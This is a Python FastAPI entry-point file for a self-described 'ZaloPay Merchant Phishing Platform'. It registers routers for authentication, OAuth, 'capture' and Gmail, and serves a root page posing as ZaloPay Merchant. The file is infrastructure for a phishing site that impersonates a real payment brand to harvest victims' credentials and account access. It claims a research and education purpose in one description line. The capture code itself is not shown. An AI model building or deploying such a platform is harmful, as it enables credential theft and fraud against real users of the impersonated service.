"""
ZaloPay Merchant Phishing Platform - Main FastAPI Application
Production-ready FastAPI application with comprehensive middleware and routing
"""

import logging
from contextlib import asynccontextmanager
from datetime import datetime, timezone

from fastapi import FastAPI, Request, status
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from database.mongodb.init_collections import initialize_collections_async

# Import configuration and database
from config import settings
from database.connection import connection_pool
from middleware.cors import setup_cors
from middleware.authentication import setup_auth_middleware
from middleware.logging import setup_logging_middleware
from middleware.rate_limiting import setup_rate_limiting

# Import routers
from routers import auth, oauth, capture, frontend, gmail, websocket_router

# Temporarily disable admin router due to import issues
# from routers import admin  # Temporarily disabled due to import errors

# Configure logging
logging.basicConfig(
    level=getattr(logging, settings.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan management"""
    # Startup
    logger.info("Starting ZaloPay Merchant Phishing Platform...")
    
    try:
        # Initialize database connections (with fallback for compatibility issues)
        logger.info("Initializing database connections...")
        try:
            success = connection_pool.initialize()
            if success:
                logger.info("Database connections initialized successfully")

                # Initialize MongoDB collections and indexes
                logger.info("Initializing MongoDB collections...")
                await initialize_collections_async()
            else:
                logger.warning("Database connections failed, running in limited mode")
        except Exception as db_error:
            logger.warning("Database initialization failed: %s", db_error)
            logger.info("Running in limited mode without database connections")

        logger.info("Application startup completed successfully")
        
    except Exception as e:
        logger.error("Application startup failed: %s", e)
        raise
    
    yield
    
    # Shutdown
    logger.info("Shutting down application...")
    try:
        connection_pool.close_all()
        logger.info("Application shutdown completed")
    except Exception as e:
        logger.error("Error during shutdown: %s", e)

# Create FastAPI application
app = FastAPI(
    title="ZaloPay Merchant Phishing Platform",
    description="Advanced phishing platform for cybersecurity research and education",
    version="1.0.0",
    docs_url="/api/docs" if settings.DEBUG else None,
    redoc_url="/api/redoc" if settings.DEBUG else None,
    openapi_url="/api/openapi.json" if settings.DEBUG else None,
    lifespan=lifespan
)

# Setup middleware
setup_cors(app)
setup_auth_middleware(app)
setup_logging_middleware(app)
setup_rate_limiting(app)

# Add trusted host middleware for security
app.add_middleware(
    TrustedHostMiddleware,
    allowed_hosts=[settings.DOMAIN, f"*.{settings.DOMAIN}", "localhost", "127.0.0.1", "backend"]
)

# Mount static files (disabled - served by frontend nginx)
# app.mount("/static", StaticFiles(directory="frontend/static"), name="static")
# app.mount("/assets", StaticFiles(directory="frontend/assets"), name="assets")

# Include routers
app.include_router(auth.router, prefix="/api/auth", tags=["Authentication"])
app.include_router(oauth.router, prefix="/api/oauth", tags=["OAuth"])
app.include_router(capture.router, prefix="/api/capture", tags=["Capture"])
# app.include_router(admin.router, prefix="/api/admin", tags=["Admin"])  # Temporarily disabled due to import errors
app.include_router(gmail.router, prefix="/api/gmail", tags=["Gmail"])
app.include_router(websocket_router.router, prefix="/api/ws", tags=["WebSocket"])
app.include_router(frontend.router, tags=["Frontend"])

# Health check endpoints
@app.get("/health", tags=["Health"])
async def health_check():
    """Basic health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "version": "1.0.0"
    }

@app.get("/health/detailed", tags=["Health"])
async def detailed_health_check():
    """Detailed health check with database status"""
    try:
        # Check database connections
        health_results = connection_pool.health_check()
        
        # Check if all databases are healthy
        all_healthy = all(
            result.get("healthy", False) 
            for result in health_results.values()
        )
        
        return {
            "status": "healthy" if all_healthy else "degraded",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "version": "1.0.0",
            "databases": health_results,
            "overall_health": "healthy" if all_healthy else "degraded"
        }
        
    except Exception as e:
        logger.error("Health check failed: %s", e)
        return JSONResponse(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            content={
                "status": "unhealthy",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "error": str(e)
            }
        )

@app.get("/health/ready", tags=["Health"])
async def readiness_probe():
    """Kubernetes readiness probe"""
    try:
        # Check if application is ready to serve traffic
        health_results = connection_pool.health_check()
        
        # Application is ready if MongoDB is healthy
        mongodb_healthy = health_results.get("mongodb", {}).get("healthy", False)
        
        if mongodb_healthy:
            return {"status": "ready"}
        else:
            return JSONResponse(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                content={"status": "not_ready"}
            )
            
    except Exception as e:
        logger.error("Readiness probe failed: %s", e)
        return JSONResponse(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            content={"status": "not_ready", "error": str(e)}
        )

@app.get("/health/live", tags=["Health"])
async def liveness_probe():
    """Kubernetes liveness probe"""
    return {"status": "alive"}

# Root endpoint
@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    """Root endpoint - redirect to merchant frontend"""
    return HTMLResponse(
        content="""
        <!DOCTYPE html>
        <html>
        <head>
            <title>ZaloPay Merchant</title>
            <meta http-equiv="refresh" content="0; url=/merchant/">
        </head>
        <body>
            <p>Redirecting to ZaloPay Merchant...</p>
        </body>
        </html>
        """
    )

# Global exception handler
@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    """Global exception handler for unhandled errors"""
    logger.error("Unhandled exception: %s", exc, exc_info=True)
    
    return JSONResponse(
        status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
        content={
            "error": "Internal server error",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "path": str(request.url)
        }
    )

# Security headers middleware
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    """Add security headers to all responses"""
    response = await call_next(request)
    
    # Security headers
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
    
    # Remove server header for security
    if "server" in response.headers:
        del response.headers["server"]
    
    return response

if __name__ == "__main__":
    import uvicorn
    
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8000,
        reload=settings.DEBUG,
        workers=1 if settings.DEBUG else settings.WORKERS,
        log_level=settings.LOG_LEVEL.lower()
    )
